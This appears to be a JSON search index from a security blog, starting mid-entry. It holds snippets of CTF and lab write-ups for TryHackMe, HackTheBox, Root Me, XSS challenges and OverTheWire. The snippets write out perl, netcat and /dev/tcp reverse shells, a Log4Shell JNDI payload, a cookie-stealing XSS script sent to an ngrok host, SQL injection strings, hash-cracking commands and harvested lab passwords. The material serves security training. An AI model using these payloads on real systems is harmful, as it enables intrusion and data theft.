70:de:54:34:34:75:c3:77:56:9e:00:b3:84:93:fe:97 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Rick is sup4r cool|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe can do a curl to the webpage and get a user in the html:curl -i http://10.10.253.214/We can try a fuzzer to the webpage:dirsearch -r -u http://10.10.253.214/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt,html -fExplotationWe can try to access with ssh but we need the RSA.We can get a login.php and access with the creds. We can see a command execution and try a reverse shell with perl:perl -e 'use Socket;$i=\"10.18.91.218\";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"sh -i\");};'Privilege EscalationIf we list all the www-data privileges we can see that we can executed any code, so we can get root.&gt; sudo -l&gt; sudo su" }, { "title": "TryHackMe | LazyAdmin", "url": "/pentesting/tryhackme/lazyadmin", "categories": "Pentesting, TryHackMe", "tags": "thm, linux", "date": "2022-05-09 00:00:00 +0200", "snippet": "EnumerationWe start a nmap at the IP.Nmap scan report for 10.10.46.20Host is up (0.076s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)| 256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)|_ 256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelThe website has a default Apache index, so we can start fuzzing it:&gt; dirsearch -r -u http://10.10.253.214/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt,html -fWe can see there are a /content/ site with a CMS.The page told us about other parts, we can fuzzing it:&gt; gobuster dir -u http://10.10.46.20/content/ -w /usr/share/wordlists/dirb/common.txt /as (Status: 301) [Size: 315] [--&gt; http://10.10.46.20/content/as/] /attachment (Status: 301) [Size: 323] [--&gt; http://10.10.46.20/content/attachment/] /inc (Status: 301) [Size: 316] [--&gt; http://10.10.46.20/content/inc/] ExplotationInside /inc/ we can see many files.Inside the file mysql_bakup_20191129023059-1.5.1.sql we can get two users (admin and manager) and a hash with the password: Password123.We can try this credentials in the /as/, where we have a login.With searchsploit we can search for the version of the SweetRice:&gt; searchsploit -m php/webapps/40716.pyWe can use it to upload a reverse shell and get access to the machine.Privilege EscalationWe can check our privileges with:&gt; sudo -lWe can see that we can use a pl file. We can copy it to the /tmp/ and change the content with a reverse shell." }, { "title": "Starting Point | Vaccine", "url": "/pentesting/htb/starting-point/vaccine", "categories": "Pentesting, HackTheBox", "tags": "htb", "date": "2022-04-30 00:00:00 +0200", "snippet": "EnumerationFirst we scan the IP:Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-30 13:27 EDTNmap scan report for 10.129.13.233Host is up (0.056s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.16 secondsExplotationFTPWe would try to login with a default user in the ftp:&gt; ftp anonymous@10.129.13.233Password: 230 Login successful.We can try to navigate throw the FTP:ftp&gt; ls-rwxr-xr-x 1 0 0 2533 Apr 13 2021 backup.zipftp&gt; get backup.zipftp&gt; cd ..We can download the zip, but we can not navigate to other directory.If we try to unzip but it ask for a password. We need to crack the password:&gt; sudo zip2john backup.zip &gt; ziphash &gt; sudo john ziphash --fork=10 -w=/usr/share/wordlists/rockyou.txt 741852963There we have logins to the webpage, but the password is encrypted.We can see that is a md5 with hash-identifier. If we search it we can get the plain text: qwerty789.Now we can login in the page.SQLWe can see that we have a table, if we search on it the url change:http://10.129.13.233/dashboard.php?search=It seems to have a SQLi, so we can try to use sqlpmap:sqlmap -r reqWhere req:GET /dashboard.php?search=a HTTP/1.1Host: 10.129.13.233User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://10.129.13.233/dashboard.phpConnection: closeCookie: PHPSESSID=05ndh3sf35jpa3l93oj9afdlgfUpgrade-Insecure-Requests: 1Cache-Control: max-age=0We check that it has a SQLi, then we can start a reverse shell:sqlmap -r req --os-shellWe should start a reverse shell in the os-shell&gt; to more accessibility. We will open a port in our host and send this command on Vaccine:&gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.15.167 9000 &gt;/tmp/fPrivilage EscalationWe can go to /var/www/html and search for credentials with:&gt; cat * | grep passWe can see the credentials: postgres:P@s5w0rd!. Now we can try:&gt; script /dev/null -c bash # To get a better shell&gt; sudo -l User postgres may run the following commands on vaccine: (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.confNow, we will execute vi.&gt; sudo /bin/vi /etc/postgresql/11/main/pg_hba.confAfterwards, we execute::!/bin/bashAnd now we are root." }, { "title": "Starting Point | Unified", "url": "/pentesting/htb/starting-point/unified", "categories": "Pentesting, HackTheBox", "tags": "htb", "date": "2022-04-30 00:00:00 +0200", "snippet": "EnumerationFirst we scan the IP:# Nmap 7.92 scan initiated Sat Apr 30 17:11:00 2022 as: nmap -A -oN nmap 10.129.213.225Nmap scan report for 10.129.213.225Host is up (0.091s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)6789/tcp open ibm-db2-admin?8080/tcp open http-proxy|_http-open-proxy: Proxy might be redirecting requests| fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 | Content-Type: text/html;charset=utf-8| Content-Language: en| Content-Length: 431| Date: Sat, 30 Apr 2022 21:11:08 GMT| Connection: close| GetRequest, HTTPOptions: | HTTP/1.1 302 | Location: http://localhost:8080/manage| Content-Length: 0| Date: Sat, 30 Apr 2022 21:11:08 GMT| Connection: close| RTSPRequest, Socks5: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8| Content-Language: en| Content-Length: 435| Date: Sat, 30 Apr 2022 21:11:08 GMT| Connection: close|_http-title: Did not follow redirect to https://10.129.213.225:8443/manage8443/tcp open ssl/nagios-nsca Nagios NSCA| http-title: UniFi Network|_Requested resource was /manage/account/login?redirect=%2Fmanage| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US| Subject Alternative Name: DNS:UniFi| Not valid before: 2021-12-30T21:37:24|_Not valid after: 2024-04-03T21:37:24Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Apr 30 17:13:57 2022 -- 1 IP address (1 host up) scanned in 176.85 secondsExplotationWe can see that UniFi Network has the version 6.4.54, which correspond to CVE-2021-44228.We can use this guide to perform the explotation.We need to download Maven and the exploit:&gt; sudo apt install maven&gt; git clone https://github.com/veracode-research/rogue-jndi &amp;&amp; cd rogue-jndi &amp;&amp; mvn packageNow we need to build a nc and send it to the Unified:&gt; echo 'bash -c bash -i &gt;&amp;/dev/tcp/10.10.15.167/4444 0&gt;&amp;1' | base64&gt; java -jar target/RogueJndi-1.1.jar --command \"bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTY3LzQ0NDQgMD4mMQo}|{base64,-d}|{bash,-i}\" --hostname \"10.10.15.167\" With Burp we need to capture the login request and change the parameter “remember” with: ”${jndi:ldap://10.10.15.167:1389/o=tomcate}”.Open a nc on the port 4444 and send the request in Burp, now we have the reverse shell-Privilage EscalationWe know that Unified use MongoDB. First we will dump the password hashes from the database:&gt; mongo --port 27117 ace --eval \"db.admin.find().forEach(printjson);\"We can try to crack the admin password, but we will add a new super user. First we make a new hash.&gt; mkpasswd -m sha-512 1234Then we add the user:&gt; mongo --port 27117 ace --eval 'db.admin.insert({ \"email\" : \"admin@localhost.local\", \"last_site_name\" : \"default\", \"name\" : \"admin\", \"time_created\" : NumberLong(100019800), \"x_shadow\" : \"$6$qm/d5rgtChdHSEXn$.YaObD5D3HuqhAXKtj7vpEn5Fwmw9yPgkydVUySQ2bBv522IEaSWr3.kYxLa22n5qHcXxU2ANiQzOrh.G4dli.\" })'We can check it we the same command.mongo --port 27117 ace --eval \"db.admin.find().forEach(printjson);\"Now we need to copy our object id and the admin object id and replace:&gt; mongo --port 27117 ace --eval 'db.privilege.insert({ \"admin_id\" : \"626e85b9f56273cd5f3e6b9e\", \"permissions\" : [ ], \"role\" : \"admin\", \"site_id\" : \"61ce278f46e0fb0012d47ee4\" });'Now we can login with our new user. We can find ssh credentials inside the configuration, so we can login with root." }, { "title": "Others | XSS Game", "url": "/challenges/xss-game/", "categories": "Challenges, XSSgame", "tags": "xss", "date": "2022-04-29 00:00:00 +0200", "snippet": "Level 1&lt;script&gt;alert(1)&lt;/script&gt;Level 2&lt;img onclick=\"alert(1)\"&gt;Level 3...' onclick=\"alert(1)\" &gt;" }, { "title": "Root Me | Web Client Very Easy", "url": "/challenges/rootme/web-client/very-easy", "categories": "Challenges, RootMe", "tags": "rootme, webclient, veryeasy", "date": "2022-04-11 00:00:00 +0200", "snippet": "HTML - disabled buttonsWe need to remove the disable tag.Javascript - AuthenticationIf we see the source code we can see that submit execute a login function.We can search that function to see the password in plain text.Javascript - SourceWe can see the source code in the header with the password.Javascript - Authentication 2In the code we can see the login.js, with the array: [“GOD:HIDDEN”].Javascript - Obfuscation 1In the head we can see the password obfuscate. With url decode we can see the password.Javascript - Obfuscation 2In the head we can see the password obfuscate. We can decode with URL decode two times, and get an array withnumber. Then with the numbers we can decode it with decimal, delimited by comma." }, { "title": "Root Me | Web Client Medium", "url": "/challenges/rootme/web-client/medium", "categories": "Challenges, RootMe", "tags": "rootme, webclient, medium", "date": "2022-04-11 00:00:00 +0200", "snippet": "Javascript - Obfuscation 3Decode the string from hex and from decimal.XSS - Stored 1In the machine:$ ngrok http 80$ php -S localhost:80In the web, the following payload:&lt;script&gt;document.write('&lt;img src=\"https://{ngrok-ip}/?cookie='+document.cookie+'\" /&gt;')&lt;/script&gt;" }, { "title": "Root Me | Web Client Easy", "url": "/challenges/rootme/web-client/easy", "categories": "Challenges, RootMe", "tags": "rootme, webclient, easy", "date": "2022-04-11 00:00:00 +0200", "snippet": "Javascript - Native codeDecrypt the code with JSfuck.Javascript - WebpackComponents…" }, { "title": "Root Me | Cryptanalysis", "url": "/challenges/rootme/cryptanalysis/very-easy", "categories": "Challenges, RootMe", "tags": "rootme, crypto, veryeasy", "date": "2022-04-10 00:00:00 +0200", "snippet": "Encoding ASCIICopy the text and decode from Hex.Encoding UUCopy the text and decode from UU.Hash - DCC$ hashcat -m 1100 '15a57c279ebdfea574ad1ff91eb6ef0c:Administrator' /usr/share/wordlists/rockyou.txt --force --potfile-disableHash - DCC2$ hashcat -m 2100 '$DCC2$10240#Administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt --force --potfile-disableHash - LM$ hashcat -m 3000 'd3bf255c530633b9aad3b435b51404ee' /usr/share/wordlists/rockyou.txt --force --potfile-disableHash - Message Digest 5We can use john to crack the hash.$ john password.txt --format=RAW-MD5Hash - NT$ hashcat -m 1000 'b4f79698831d92b61f886438e36c0c52' /usr/share/wordlists/rockyou.txt --rules-file OneRuleToRuleThemAll.rule --force --potfile-disableHash - SHA-2We just need to search the hash and get 4dM1n.With icyberchef We can encoded it to SHA1." }, { "title": "Others | XSS Pwnfunction", "url": "/challenges/xss-pwnfunction", "categories": "Challenges, XSSpwnfunction", "tags": "xss", "date": "2022-03-28 00:00:00 +0200", "snippet": "Ma Spaghet!?somebody=&amp;lt;input type=\"button\" onclick=\"alert(1337)\"&amp;gt;JefffTo escape the eval() function we can use - -.?jeff=\"-alert(1337)-\"Ugandan KnucklesWe just need to change the &lt; to %3C and the &gt;Because we can not click, we just need to set autofocus and change the inpu.?wey=\" onfocus=alert(1337) autofocus=\"Ricardo Milos?ricardo=javascript:alert(1337)Ah That’s HawtIn order to bypass the replace we need to encode a simple alert (&lt;svg onload=”alert(1337)”&gt;).First we will encode the alert to HTML Entity, and then the rest to URL Encode.?markassbrownlee=%3Csvg%20onload%3D%22%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26lpar%3B%26%2349%3B%26%2351%3B%26%2351%3B%26%2355%3B%26rpar%3B%22%3E%0A%0ALigmaWe need to pass the Javascript code (alert) to JSFuck to eliminate all the letters and numbers.?ballsafiaWe need just need to give a function that will lower case ALERT.?mafia=Function(/ALERT(1337)/.source.toLowerCase())()Ok, BoomerDOMpurify can be bypass. Thanks to form we can inject code inside the brackets that DOMpurify can not serialize.Source?boomer=&amp;lt;form&amp;gt;&amp;lt;math&amp;gt;&amp;lt;mtext&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;form&amp;gt;&amp;lt;mglyph&amp;gt;&amp;lt;style&amp;gt;&amp;lt;/math&amp;gt;&amp;lt;img src onerror=alert(1337)&amp;gt;Area 51?debug=&amp;lt;?php&amp;gt;&amp;lt;&amp;lt;svg%20onload=alert(1337)&amp;gt;" }, { "title": "Starting Point | Oopsie", "url": "/pentesting/htb/starting-point/oopsie", "categories": "Pentesting, HackTheBox", "tags": "htb", "date": "2022-03-06 00:00:00 +0100", "snippet": "EnumerationThe nmap will show us:Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-05 16:47 ESTNmap scan report for 10.129.111.155Host is up (0.048s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.95 secondsIf we search the ip in the Firefox we can access to a webpage:Now we can crawl the page with ZAP, we will find a login page:FootholdNow we have access to the login page:We can see we need super admin privilages to get access to the super admin account:We can see the id=2.:If we change to 1:Now we can use those credentials to change the cookies:We will upload a reverse shell in php and use gobuster to find where it is uploaded:&gt; gobuster dir -u http://10.129.95.191/ -w /usr/share/wordlists/directory-list-2.3-small.txt -x php /uploads (Status: 301) [Size: 316] [--&gt; http://10.129.95.191/uploads/]We will open a netcat and execute the reverse shell through the browser:&gt; sudo nc -lvvp 1234Now we have access to the system and to the user flag:&gt; cat /home/robert/user.txtWe can import a python module to get a better shell:&gt; python3 -c 'import pty;pty.spawn(\"/bin/bash\")'Privilege EscalationInside we can search in the Apache server and find the password:www-data@oopsie:/var/www/html/cdn-cgi/login$ cat * | grep pass if($_POST[\"username\"]===\"admin\" &amp;&amp; $_POST[\"password\"]===\"MEGACORP_4dm1n!!\")In the db.php file we can get another passwords:www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php &lt;?php $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage'); ?&gt;We can now use that password to access robert user:www-data@oopsie:/var/www/html/cdn-cgi/login$ su robertPassword: M3g4C0rpUs3r!With the id command we can see that Robert is in the same group as bugtracker.robert@oopsie:/$ iduid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)We can now search for the bugtracker group:robert@oopsie:/$ find / -group bugtracker 2&gt;/dev/null/usr/bin/bugtrackerWe can see that bugtracker is using cat. If we create a file name cat inside /tmp, replace the content by /bin/sh and change the PATH to /tmp and execute bugtracker, we get a shell with root.I need to remove the file cat after getting access to root, so I can make a cat to the flags." }, { "title": "Starting Point | Archetype", "url": "/pentesting/htb/starting-point/archetypr", "categories": "Pentesting, HackTheBox", "tags": "htb", "date": "2022-02-28 00:00:00 +0100", "snippet": "EnumerationThe nmap will show us:&gt; nmap -sV 10.129.221.7 -oN nmap Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-28 11:45 ESTNmap scan report for 10.129.221.7Host is up (0.049s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.15 secondsWe will try to see which folders are share.&gt; smbclient -L //10.129.221.7/ Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin backups Disk C$ Disk Default share IPC$ IPC Remote IPCAnd then try to connect to backups:&gt; smbclient //10.129.221.7/backups/smb: \\&gt; lssmb: \\&gt; get prod.dtsConfigsmb: \\&gt; exit&gt; cat prod.dtsConfig There we can see:Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svcNow we can try to login with the scripts mssqlclient.py.We will use the credentials provides by the prod.dtsConfig file.&gt; sudo python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.221.7 -windows-authFootholdNow we are in the SQL server. With the command xp_cmdshell we can try to execute the shell, but we will recieve the following error:[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell'Now we need to activate xp_cmdshell. With the following command we can see all the config aviable.SQL&gt; sp_configureWe need to activate the advanced options:SQL&gt; EXECUTE sp_configure 'show advanced options', 1;SQL&gt; RECONFIGURE;And then we can activate the shell:SQL&gt; EXECUTE sp_configure 'xp_cmdshell', 1;SQL&gt; RECONFIGURE;Now we can get the user flag:SQL&gt; xp_cmdshell type C:\\Users\\sql_svc\\Desktop\\user.txtWe will make a reverse shell.First we will start a nc in the port 443.&gt; sudo nc -lvnp 443Now we will create a http server in the same folder where we have the nc64.exe file.&gt; sudo python3 -m http.server 80 We need to download that file in the server. Because we don’t have root access we will use the normal user.SQL&gt; xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; wget http://10.10.14.88/nc64.exe -outfile nc64.exe\"The http.server will receive the following line:10.129.221.7 - - [28/Feb/2022 12:51:53] \"GET /nc64.exe HTTP/1.1\" 200 -Now we execute the command and send the cmd to the 443 port (where we are listening):SQL&gt; xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; .\\nc64.exe -e cmd.exe 10.10.14.88 443\"Privilege EscalationNow we will need to use winPEAS to do the privilege escalation. We will change the prompt to powershell, and download the file.C:\\Users\\sql_svc\\Downloads&gt;powershellPS C:\\Users\\sql_svc\\Downloads&gt; wget http://10.10.14.88/winPEASx64.exe -outfile winPEASx64.exeIn the http.server we can see that works:C:\\Users\\sql_svc\\Downloads&gt;powershell10.129.221.7 - - [28/Feb/2022 13:01:29] \"GET /winPEASx64.exe HTTP/1.1\" 200 -No we will execute the script:PS C:\\Users\\sql_svc\\Downloads&gt; .\\winPEASx64.exeWe can check the shell history for credentials (like .bash_history).PS C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine&gt; type ConsoleHost_history.txt net.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!!With the password we have now we will use another script from impacket, psexec.py:&gt; python3 psexec.py administrator@10.129.221.7We can use the password from before and now we are in the Administrator user:C:\\Windows\\system32&gt; type C:\\Users\\Administrator\\Desktop\\root.txt" }, { "title": "Starting Point | Tier 1", "url": "/pentesting/htb/starting-point/tier1", "categories": "Pentesting, HackTheBox", "tags": "htb", "date": "2022-02-27 00:00:00 +0100", "snippet": "AppointmentConnectionWe can search the IP in the navbar to get a website.We will try a basic sql-injection, login with the user:' or '1'='1' #For the password we just need to write a letter.FlagThe flag will be in front of us.SequelConnectionWe will use mysql to connect, with the root user.&gt; mysql -u root -h 10.129.220.35FlagNow we are in, we just need to list all the databases and search for the flag.MariaDB [(none)]&gt; show databases;+--------------------+| Database |+--------------------+| htb || information_schema || mysql || performance_schema |+--------------------+MariaDB [(none)]&gt; use htb;MariaDB [htb]&gt; show tables;+---------------+| Tables_in_htb |+---------------+| config || users |+---------------+MariaDB [htb]&gt; select * from config;CrocodileConnectionWe will connect with ftp and the user anonymous. There we can download two files, with users and passwords.&gt; ftp 10.129.122.93With gobuster we can check for others files in the webpage, and we can see a login.php:&gt; gobuster dir -u http://10.129.122.93/ -w /usr/share/wordlists/directory-list-2.3-small.txt -x phpFlagWe will have now this page:With the admin login we can enter and get our flag.ResponderEnumerationNmap:#Nmap 7.92 scan initiated Sat Apr 30 10:43:29 2022 as: nmap -p- -T5 -oN nmap2 10.129.212.41Nmap scan report for 10.129.212.41Host is up (0.054s latency).Not shown: 65532 filtered tcp ports (no-response)PORT STATE SERVICE80/tcp open http5985/tcp open wsman7680/tcp open pando-pub#Nmap done at Sat Apr 30 10:45:10 2022 -- 1 IP address (1 host up) scanned in 101.42 secondsWe need to add the IP with the domain to access the webpage.ExplotationWe found a LFI in the page.Then we can start a Samba server and forces the page to load it:&gt; sudo responder -I tun0 -AAnd then:http://unika.htb/index.php?page=//10.10.15.167/kaliThis will give us the password encrypted. With john we can decode it:john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2We can found all the previosly hashes in /usr/share/responder/logs/Responder-Session.log.Finally we can exploit winrm and get the flag:&gt; evil-winrm -i 10.129.212.41 -u Administrator -p badmintonFlagFinally we can get the flag in the Desktop." }, { "title": "Starting Point | Tier 0", "url": "/pentesting/htb/starting-point/tier0", "categories": "Pentesting, HackTheBox", "tags": "htb", "date": "2022-02-27 00:00:00 +0100", "snippet": "MeowConnectionWe just need to connect with telnet. The user will be root, with no password.&gt; telnet 10.129.53.229&gt; Meow login: rootFlagThen we will have the flag just there.&gt; ls&gt; cat flag.txtFawnConnectionIn this case we need to make a connection with ftp. We will use the anonymous user to connect, with no password.&gt; ftp 10.129.1.14Name (10.129.1.14:kali): anonymousPassword:FlagWith get, we can download the file.ftp&gt; lsftp&gt; get flag.txtftp&gt; exit&gt; cat flag.txtDancingConnectionWe will need to use samba to connect. With the option -L we can see all the folders we have. We can see that the last one doesn’t have protection.&gt; smbclient -L //10.129.119.218/ Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC WorkShares Disk &gt; smbclient //10.129.119.218/WorkSharesFlagWith the command get we can download the file.smb: \\&gt; lssmb: \\&gt; cd James.P\\smb: \\James.P\\&gt; lssmb: \\James.P\\&gt; get flag.txtsmb: \\James.P\\&gt; exit&gt; cat flag.txt " }, { "title": "OverTheWire | Bandit", "url": "/challenges/overthewire/bandit", "categories": "Challenges, OverTheWire", "tags": "bash", "date": "2022-01-29 00:00:00 +0100", "snippet": "Level 1$ ssh bandit0@bandit.labs.overthewire.org -p 2220$ cat readmeboJ9jbbUNNfktd78OOpsqOltutMc3MY1Level 2$ ssh bandit1@bandit.labs.overthewire.org -p 2220$ cat ./-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9Level 3$ ssh bandit2@bandit.labs.overthewire.org -p 2220$ cat spaces\\ in\\ this\\ filenameUmHadQclWmgdLOKQ3YNgjWxGoRMb5luKLevel 4$ ssh bandit3@bandit.labs.overthewire.org -p 2220$ cat inhere/.hiddenpIwrPrtPN36QITSp3EQaw936yaFoFgABLevel 5$ ssh bandit4@bandit.labs.overthewire.org -p 2220$ cat inhere/-file07koReBOKuIDDepwhWk7jZC0RTdopnAYKhLevel 6$ ssh bandit5@bandit.labs.overthewire.org -p 2220$ ls -alR | grep 1033$ find . -type f -name \".file2\" -size 1033c$ cd maybehere07$ cat .file2DXjZPULLxYr17uwoI01bNLQbtFemEgo7Level 7$ ssh bandit6@bandit.labs.overthewire.org -p 2220$ find / -type f -size 33c -user bandit7 -group bandit6$ cat /var/lib/dpkg/info/bandit7.password HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzsLevel 8$ ssh bandit7@bandit.labs.overthewire.org -p 2220$ cat data.txt | grep millionthcvX2JJa4CFALtqS87jk27qwqGhBM9plVLevel 9$ ssh bandit8@bandit.labs.overthewire.org -p 2220$ cat data.txt | sort | uniq -uUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhRLevel 10$ ssh bandit9@bandit.labs.overthewire.org -p 2220$ strings data.txt | grep =truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLkLevel 11$ ssh bandit10@bandit.labs.overthewire.org -p 2220$ base64 -d data.txtIFukwKGsFW8MOq3IRFqrxE1hxTNEbUPRLevel 12$ ssh bandit11@bandit.labs.overthewire.org -p 2220$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu" }, { "title": "Root Me | App Script", "url": "/challenges/rootme/app-script/very-easy", "categories": "Challenges, RootMe", "tags": "rootme, appscript, veryeasy", "date": "2022-01-25 00:00:00 +0100", "snippet": "Bash - System 1We need to copy cat into our folder, then change the name to “ls” and change the path to that folder.Now the script will read it as cat.$ mkdir /tmp/zeropio$ cp /bin/cat /tmp/zeropio$ mv /tmp/zeropio/cat /tmp/zeropio/ls$ export PATH=/tmp/zeropio:$PATH$ ./ch11Sudo - weak configurationWe need to see all the sudo options (with -l). Then we can see we need to use the cracked user, who can only do a cat to ./notes/ .$ sudo -l$ sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/notes/../ch1cracked/.passwdBash - System 2As we did in the first, we need to use nano instead of cat because the script have the options -al.$ mkdir /tmp/zeropio$ cp /bin/nano /tmp/zeropio$ mv /tmp/zeropio/nano /tmp/zeropio/ls$ export PATH=/tmp/zeropio2:$PATH$ ./ch12LaTex InputWe will create a main.tex file with the following content:\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/challenge/app-script/ch23/.passwd}\\end{document}We will generate a main.pdf file:$ ./setuid-wrapper /tmp/main.texThen we will just get the pdf: $ scp -P 2222 app-script-ch23@challenge02.root-me.org:/tmp/tmp.pIzF7UG6do/main.pdf ." } ]
